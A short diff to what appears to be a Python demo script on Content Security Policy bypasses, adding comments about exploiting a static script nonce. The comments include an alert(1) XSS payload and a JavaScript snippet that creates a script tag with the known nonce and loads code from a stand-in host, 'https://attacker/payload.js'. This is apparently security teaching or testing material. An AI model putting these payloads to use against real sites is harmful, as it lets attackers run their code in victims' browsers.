@@ -298,3 +298,11 @@ if __name__ == '__main__':
 
 # Exploit --> <script nonce="...">alert(1)</script>
 # Real world scenario: An attacker manages to inject a script tag with the known static nonce into a vulnerable input field, allowing the script to execute despite the CSP.
+# DOM XSS not possible. GPT has response.
+
+## For server XSS - static nonce exploit -
+## Creating script node with known nonce via external JS —
+    # var s = document.createElement('script');
+    # s.setAttribute('nonce','KNOWN_NONCE');
+    # s.src = 'https://attacker/payload.js';
+    # document.head.appendChild(s);
